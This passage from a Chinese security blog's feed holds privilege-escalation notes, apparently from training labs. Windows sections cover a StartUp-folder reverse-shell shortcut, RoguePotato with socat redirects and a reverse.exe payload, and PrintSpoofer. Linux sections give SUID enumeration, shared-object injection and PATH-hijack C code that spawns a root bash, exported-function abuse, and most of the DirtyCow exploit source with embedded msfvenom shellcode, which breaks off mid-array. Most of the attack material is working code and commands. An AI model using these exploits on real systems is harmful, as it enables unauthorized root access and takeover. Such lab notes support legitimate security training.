正在以管理员权限运行：</span><br><span class="line">tasklist /V | <span class="built_in">findstr</span> mspaint.exe</span><br><span class="line"></span><br><span class="line"># 在画图中，单击“文件”，然后单击“打开”。在打开文件对话框中，点击导航输入并粘贴：</span><br><span class="line"><span class="function">file://<span class="title">c</span>:/<span class="title">windows</span>/<span class="title">system32</span>/<span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 按 <span class="title">Enter</span> 以生成以管理员权限运行的命令提示符。</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526142759387.png" alt="image-20220526142759387"></p><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526142549020.png" alt="image-20220526142549020"></p><h3 id="7-Startup-应用程序"><a href="#7-Startup-应用程序" class="headerlink" title="#7 Startup 应用程序"></a>#7 Startup 应用程序</h3><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526143354340.png" alt="image-20220526143354340"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 使用 accesschk.exe，注意 BUILTIN\Users 组可以将文件写入 StartUp 目录：</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">d</span> &quot;<span class="title">C</span>:\<span class="title">ProgramData</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Start</span> <span class="title">Menu</span>\<span class="title">Programs</span>\<span class="title">StartUp</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#使用 <span class="title">cscript</span>，运行 <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">CreateShortcut.vbs</span> 脚本，该脚本应该在 <span class="title">StartUp</span> 目录中为您的 <span class="title">reverse.exe</span> 可执行文件创建一个新的快捷方式：</span></span><br><span class="line"><span class="function"><span class="title">cscript</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">CreateShortcut.vbs</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 在 <span class="title">Kali</span> 上启动一个监听器，然后等待管理员登录：</span></span><br><span class="line"><span class="function"># 以管理员身份运行的 <span class="title">shell</span> 应连接回您的侦听器。</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526143837667.png" alt="image-20220526143837667"></p><h3 id="8-令牌模拟"><a href="#8-令牌模拟" class="headerlink" title="#8 令牌模拟"></a>#8 令牌模拟</h3><p>) 1 - Rogue Potato(流氓土豆)</p><p>参考文章 : <a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato">https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato</a></p><p>利用详情 : <a href="https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html">https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html</a></p><p>Tools : <a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p><ul><li>本地服务权限账户</li><li>启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege </li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 在您的机器上运行socat重定向（替换VICTIM_IP）：</span><br><span class="line">socat tcp-listen:<span class="number">135</span>,reuseaddr,fork tcp:VICTIM_IP:<span class="number">9999</span></span><br><span class="line">sudo socat tcp-listen:<span class="number">135</span>,reuseaddr,fork tcp:<span class="number">10</span>.<span class="number">10</span>.<span class="number">79</span>.<span class="number">228</span>:<span class="number">9999</span></span><br><span class="line"></span><br><span class="line"># 执行 PoC（替换YOUR_IP和command）：</span><br><span class="line">.\RoguePotato.exe -r YOUR_IP -e &quot;command&quot; -l <span class="number">9999</span></span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">RoguePotato.exe</span> -<span class="title">r</span> 10.11.53.68 -<span class="title">e</span> &quot;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span>&quot; -<span class="title">l</span> 9999</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220527103837310.png" alt="image-20220527103837310"></p><p>) 2 - PrintSpoofer</p><p>漏洞详细 ： <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a></p><p>Tools : <a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></p><ul><li>需要本地服务或网络服务访问</li><li>启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</li></ul><p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220527144905068.png" alt="image-20220527144905068"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0-信息收集&quot;&gt;&lt;a href=&quot;#0-信息收集&quot; class=&quot;headerlink&quot; title=&quot;#0 信息收集&quot;&gt;&lt;/a&gt;#0 信息收集&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    
    <category term="提权" scheme="https://z4ynadmin.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux Privesc</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/Linux-Privesc/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/Linux-Privesc/</id>
    <published>2022-11-07T07:27:25.000Z</published>
    <updated>2022-11-07T07:29:55.312Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-枚举脚本"><a href="#0-枚举脚本" class="headerlink" title="#0 枚举脚本"></a>#0 枚举脚本</h3><p><strong>linpeas.sh：</strong><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p><strong>LinEnum：</strong><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a></p><p><strong>lse.sh：</strong><a href="https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh">https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh</a></p><hr><h3 id="1-滥用-SUID-GUID-文件"><a href="#1-滥用-SUID-GUID-文件" class="headerlink" title="#1 滥用 SUID/GUID 文件"></a>#1 滥用 SUID/GUID 文件</h3><ul><li>查疑似漏洞</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">$ find / -perm -4000  2&gt;/dev/null</span><br><span class="line">$ find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></figure><ul><li>exim提权</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">......</span><br><span class="line">-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3<span class="comment">#exim 可以提权</span></span><br><span class="line">......</span><br><span class="line">$ searchsploit -m 39535</span><br></pre></td></tr></table></figure><ul><li>SUID-共享对象注入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">......</span><br><span class="line">-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/<span class="built_in">local</span>/bin/suid-so<span class="comment">#可执行文件容易受到共享对象注入的影响</span></span><br><span class="line">......</span><br><span class="line">user@debian:~$ strace /usr/<span class="built_in">local</span>/bin/suid-so 2&gt;&amp;1 | grep -iE <span class="string">&quot;open|access|no such file&quot;</span>    <span class="comment">#对文件运行strace并在输出中搜索打开/访问调用和“没有这样的文件”错误</span></span><br><span class="line">access(<span class="string">&quot;/etc/suid-debug&quot;</span>, F_OK)         = -1 ENOENT (No such file or directory)</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY)      = 3</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/lib/libdl.so.2&quot;</span>, O_RDONLY)       = 3</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/usr/lib/libstdc++.so.6&quot;</span>, O_RDONLY) = 3</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/lib/libm.so.6&quot;</span>, O_RDONLY)        = 3</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/lib/libgcc_s.so.1&quot;</span>, O_RDONLY)    = 3</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">&quot;/lib/libc.so.6&quot;</span>, O_RDONLY)        = 3</span><br><span class="line">open(<span class="string">&quot;/home/user/.config/libcalc.so&quot;</span>, O_RDONLY) = -1 ENOENT (No such file or directory)<span class="comment">#请注意，可执行文件尝试在我们的主目录中加载/home/user/.config/libcalc.so共享对象，但找不到它</span></span><br><span class="line"></span><br><span class="line">user@debian:~$ cat /home/user/tools/suid/libcalc.c<span class="comment">#libcalc.c 源码</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">static void inject() __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">inject</span></span>() &#123;</span><br><span class="line">setuid(0);</span><br><span class="line">system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ mkdir /home/user/.config<span class="comment">#为 libcalc.so 文件创建.config目录</span></span><br><span class="line">$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c<span class="comment">#将代码编译到suid-so可执行文件所在位置的共享对象中</span></span><br><span class="line">$ /usr/<span class="built_in">local</span>/bin/suid-so<span class="comment">#执行suid-so可执行文件</span></span><br><span class="line">Calculating something, please <span class="built_in">wait</span>...</span><br><span class="line">bash-4.1<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>SUID-环境变量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/local/bin/suid-env可执行文件可以被利用，因为它继承了用户的 PATH 环境变量并尝试在不指定绝对路径的情况下执行程序</span></span><br><span class="line">user@debian:~$ find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">......</span><br><span class="line">-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/<span class="built_in">local</span>/bin/suid-env</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">user@debian:~$ /usr/<span class="built_in">local</span>/bin/suid-env<span class="comment">#执行该文件并注意它似乎正在尝试启动apache2网络服务器</span></span><br><span class="line">[....] Starting web server: apache2httpd (pid 1623) already running</span><br><span class="line">. ok </span><br><span class="line"></span><br><span class="line">user@debian:~$ strings /usr/<span class="built_in">local</span>/bin/suid-env<span class="comment">#strings在文件上运行字符串以查找可打印字符的字符串</span></span><br><span class="line">.....</span><br><span class="line">fff.</span><br><span class="line">fffff.</span><br><span class="line">l$ L</span><br><span class="line">t$(L</span><br><span class="line">|<span class="variable">$0H</span></span><br><span class="line">service apache2 start<span class="comment">#一行（“service apache2 start”）表明正在调用服务可执行文件来启动网络服务器，但未使用可执行文件的完整路径（/usr/sbin/service）。</span></span><br><span class="line"></span><br><span class="line">user@debian:~$ cat /home/user/tools/suid/service.c<span class="comment">#service.c源码</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">setuid(0);</span><br><span class="line">system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">user@debian:~$ gcc -o service /home/user/tools/suid/service.c<span class="comment">#编译</span></span><br><span class="line">user@debian:~$ PATH=.:<span class="variable">$PATH</span> /usr/<span class="built_in">local</span>/bin/suid-env<span class="comment">#将当前目录（或新服务可执行文件所在的位置）添加到 PATH 变量中，然后运行suid-env可执行文件以获得 root shell</span></span><br><span class="line">root@debian:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br></pre></td></tr></table></figure><ul><li>SUID-滥用Shell功能</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/local/bin/suid-env2 可执行文件与 /usr/local/bin/suid-env 相同，只是它使用服务可执行文件 (/usr/sbin/service) 的绝对路径来启动 apache2 网络服务器。</span></span><br><span class="line">user@debian:~$ find / -<span class="built_in">type</span> f -a \( -perm -u+s -o -perm -g+s \) -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">......</span><br><span class="line">-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/<span class="built_in">local</span>/bin/suid-env2</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">user@debian:~$ strings /usr/<span class="built_in">local</span>/bin/suid-env2<span class="comment">#strings在文件上运行字符串以查找可打印字符的字符串</span></span><br><span class="line">......</span><br><span class="line">fff.</span><br><span class="line">fffff.</span><br><span class="line">l$ L</span><br><span class="line">t$(L</span><br><span class="line">|<span class="variable">$0H</span></span><br><span class="line">/usr/sbin/service apache2 start<span class="comment">#可执行文件 (/usr/sbin/service) 的绝对路径来启动 apache2 网络服务器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在Bash版本&lt;4.2-048，可以定义名称类似于文件路径的 shell 函数，然后导出这些函数，以便使用它们而不是该文件路径中的任何实际可执行文件。</span></span><br><span class="line">user@debian:~$ /bin/bash --version<span class="comment">#查看Bash版本</span></span><br><span class="line">GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)</span><br><span class="line">Copyright (C) 2009 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line"></span><br><span class="line">This is free software; you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个名为“ /usr/sbin/service ”的 Bash 函数，该函数执行一个新的 Bash shell（使用 -p 以保留权限）并导出该函数</span></span><br><span class="line">user@debian:~$ <span class="keyword">function</span> /usr/sbin/service &#123; /bin/bash -p; &#125; </span><br><span class="line">user@debian:~$ <span class="built_in">export</span> -f /usr/sbin/service</span><br><span class="line">user@debian:~$ /usr/<span class="built_in">local</span>/bin/suid-env2<span class="comment">#运行suid-env2可执行文件以获取 root shell</span></span><br><span class="line">root@debian:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="2-sudo提权"><a href="#2-sudo提权" class="headerlink" title="#2 sudo提权"></a>#2 sudo提权</h3><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><hr><h3 id="3-内核提权"><a href="#3-内核提权" class="headerlink" title="#3 内核提权"></a>#3 内核提权</h3><p><strong>枚举脚本：</strong></p><p><a href="https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh">https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh</a></p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl">https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl</a></p><ul><li>dirctycow(脏牛提权 exp)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools/kernel-exploits$ cat /home/user/tools/kernel-exploits/dirtycow/c0w.c</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* A PTRACE_POKEDATA variant of CVE-2016-5195</span></span><br><span class="line"><span class="comment">* should work on RHEL 5 &amp; 6</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* (un)comment correct payload (x86 or x64)!</span></span><br><span class="line"><span class="comment">* $ gcc -pthread c0w.c  -o c0w</span></span><br><span class="line"><span class="comment">* $ ./c0w</span></span><br><span class="line"><span class="comment">* DirtyCow root privilege escalation</span></span><br><span class="line"><span class="comment">* Backing up /usr/bin/passwd.. to /tmp/bak</span></span><br><span class="line"><span class="comment">* mmap fa65a000</span></span><br><span class="line"><span class="comment">* madvise 0</span></span><br><span class="line"><span class="comment">* ptrace 0</span></span><br><span class="line"><span class="comment">* $ /usr/bin/passwd </span></span><br><span class="line"><span class="comment">* [root@server foo]# whoami </span></span><br><span class="line"><span class="comment">* root</span></span><br><span class="line"><span class="comment">* [root@server foo]# id</span></span><br><span class="line"><span class="comment">* uid=0(root) gid=501(foo) groups=501(foo)</span></span><br><span class="line"><span class="comment">* @KrE80r</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// change if no permissions to read</span></span><br><span class="line"><span class="keyword">char</span> suid_binary[] = <span class="string">&quot;/usr/bin/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shell_code[] = &#123;</span><br><span class="line">  <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xb1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xea</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span 